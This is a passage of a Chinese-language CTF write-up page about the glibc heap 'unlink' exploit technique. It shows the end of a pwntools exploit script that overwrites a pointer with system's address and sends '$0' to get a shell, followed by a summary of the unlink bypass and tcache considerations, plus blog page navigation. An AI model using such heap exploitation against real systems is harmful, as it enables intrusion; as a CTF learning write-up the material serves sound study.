class="number">1</span>,p64(system_addr))</span><br><span class="line">p.sendline(<span class="string">"$0"</span>)</span><br><span class="line">p.interactive()    </span><br><span class="line"><span class="comment">#CTF&#123;de7effd8864f018660e178b96b8b4ffc&#125;</span></span><br></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.关于这道的基本分析可以参考<a href="https://www.anquanke.com/post/id/162882" target="_blank" rel="noopener">安全客</a>;<br>2.关于unlink的绕过关键就是找&amp;p，然后构造chunk,从而绕过unlink;<br>3.这个unlink的操作时，利用的libc的版本是2.26的，所以没有tcache机制；2.26以后的libc是有tcache机制的，所以那个时候释放的smallbin可能为单链，没有unlink的操作，所以要先申请7个chunks,然后释放后将Tcachebins填满，然后再进行其他操作；</p>
+
+      
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/03/03/unlink/">Unlink</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 钞sir 的个人博客">钞sir</a></p>
+        <p><span>发布时间:</span>2019年03月03日 - 19时09分</p>
+        <p><span>最后更新:</span>2019年03月03日 - 19时09分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/03/03/unlink/" title="Unlink">https://cc-sir.github.io/2019/03/03/unlink/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://cc-sir.github.io/2019/03/03/unlink/　　作者: 钞sir" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target="_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2019/03/01/Tcache/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Hgame2019_babytcache</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过方法"><span class="toc-number">2.</span> <span class="toc-text">绕过方法</span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#演示"><span class="toc-number"></span> <span class="toc-text">演示</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#思路"><span class="toc-number">1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number"></span> <span class="toc-text">总结</span></a>
+</li></div>
+<input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2019/03/01/Tcache/" title="下一篇: Hgame2019_babytcache">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/03/03/unlink/">Unlink</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/01/Tcache/">Hgame2019_babytcache</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/01/pwnable_tw/">pwnable.tw</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/22/hacknote/">pwnable.tw_hacknote</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/29/dynelf/">DynELF</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/28/ichunqiu_easypwn/">Ichunqiu_Easypwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/26/ret2libc/">Ret2libc</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/24/ret2shellcode/">Ret2ShellCode</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/20/overflow_freed_chunk/">Overflow Freed Chunk</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/19/Fastbin_Double_Free/">Fastbin Double Free</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/11/use_after_free/">Use After Free</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/11/hello-world/">Hello World</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2019 钞sir
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit">海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style="display:none">
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
